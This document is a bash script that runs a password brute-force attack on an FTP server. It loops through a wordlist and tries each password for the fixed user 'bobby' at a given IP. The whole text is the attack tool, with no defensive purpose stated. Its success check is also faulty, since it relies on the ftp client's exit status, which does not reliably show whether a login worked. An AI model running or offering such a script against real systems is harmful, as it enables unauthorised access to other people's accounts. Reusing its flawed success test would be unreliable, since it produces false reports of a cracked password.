#!/bin/bash

# Check if IP is provided
if [ -z "$1" ]; then
  echo "Usage: $0 <IP_ADDRESS>"
  exit 1
fi

IP=$1
WORDLIST="wordlist.txt"  # Default wordlist file

# Check if the wordlist file exists
if [ ! -f "$WORDLIST" ]; then
  echo "Password list file 'wordlist.txt' does not exist!"
  exit 1
fi

# Loop through the wordlist and attempt login
while IFS= read -r PASSWORD; do
  echo "Attempting to log in with password: $PASSWORD"
  
  # Try to connect using FTP
  ftp -n $IP <<EOF
user bobby $PASSWORD
bye
EOF
  
  # Check if the login was successful (FTP exit status 0 indicates success)
  if [ $? -eq 0 ]; then
    echo "Login successful with password: $PASSWORD"
    break
  fi
done < "$WORDLIST"

echo "Brute-force attack complete."

